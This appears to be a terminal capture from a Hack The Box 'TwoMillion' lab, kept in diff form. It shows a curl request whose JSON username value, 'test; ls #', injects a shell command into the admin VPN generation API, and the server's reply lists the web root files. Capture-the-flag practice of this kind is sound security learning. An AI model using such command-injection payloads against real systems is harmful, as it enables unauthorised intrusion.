@@ -1,0 +1,35 @@
+┌──(kali㉿kali)-[~/Escritorio/HTB/TwoMillion/nmap]
+└─$ curl -v -X POST http://2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=cr3vpcu1asv67q6vojp0snf586" --header "Content-Type: application/json" --data '{"username":"test; ls #"}'
+Note: Unnecessary use of -X or --request, POST is already inferred.
+*   Trying 10.10.11.221:80...
+* Connected to 2million.htb (10.10.11.221) port 80
+> POST /api/v1/admin/vpn/generate HTTP/1.1
+> Host: 2million.htb
+> User-Agent: curl/8.4.0
+> Accept: */*
+> Cookie: PHPSESSID=cr3vpcu1asv67q6vojp0snf586
+> Content-Type: application/json
+> Content-Length: 25
+> 
+< HTTP/1.1 200 OK
+< Server: nginx
+< Date: Wed, 06 Mar 2024 02:01:05 GMT
+< Content-Type: text/html; charset=UTF-8
+< Transfer-Encoding: chunked
+< Connection: keep-alive
+< Expires: Thu, 19 Nov 1981 08:52:00 GMT
+< Cache-Control: no-store, no-cache, must-revalidate
+< Pragma: no-cache
+< 
+Database.php
+Router.php
+VPN
+assets
+controllers
+css
+fonts
+images
+index.php
+js
+views
+* Connection #0 to host 2million.htb left intact
